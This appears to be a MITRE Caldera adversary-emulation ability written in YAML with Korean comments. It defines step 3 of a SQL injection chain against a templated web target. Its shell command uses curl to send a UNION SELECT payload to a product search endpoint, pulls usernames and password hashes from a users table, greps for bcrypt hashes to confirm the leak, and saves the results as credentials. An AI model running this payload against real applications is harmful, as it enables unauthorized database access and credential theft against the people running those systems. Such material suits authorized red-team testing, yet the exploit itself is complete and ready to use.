- id: a5b3c1e9-4d6f-4a8b-c0e4-7f9a1b3d5c7e
  name: SQL Injection - UNION Based Data Extraction (Step 3)
  description: UNION SELECT를 이용해 PostgreSQL users 테이블의 username/password를 추출합니다. products 테이블 컬럼 수(5)에 맞춰 UNION 페이로드를 구성하여 BadSqlGrammar를 회피합니다. Step 1(에러 확인), Step 2(컬럼 수 파악) 이후 실행하는 최종 데이터 탈취 단계입니다.
  tactic: initial-access
  technique:
    attack_id: T1190
    name: Exploit Public-Facing Application
  platforms:
    linux:
      sh:
        command: |-
          OP_ID="#{operation_id}"
          TECH_ID="T1190"
          ABILITY_ID="a5b3c1e9-4d6f-4a8b-c0e4-7f9a1b3d5c7e"
          TARGET="http://#{target.url}"

          echo "[*] Step 3: UNION SELECT로 users 테이블 credential 추출 (5컬럼 정렬)"
          RESULT=$(curl -s \
            -H "X-Caldera-Op-Id: ${OP_ID}" \
            -H "X-Caldera-Technique: ${TECH_ID}" \
            -H "X-Caldera-Ability: ${ABILITY_ID}" \
            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
            "${TARGET}/api/products/search?keyword=%27+UNION+SELECT+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--")

          echo "[+] 추출 결과:"
          echo "${RESULT}"

          # bcrypt 해시 패턴 검출 시 데이터 유출 성공 표시
          if echo "${RESULT}" | grep -qE '\$2[aby]\$[0-9]{2}\$'; then
            echo "[+] bcrypt 해시 검출 - UNION_DATA_LEAKED 확인"
          fi
        parsers:
          plugins.stockpile.app.parsers.basic:
          - source: domain.user.credentials
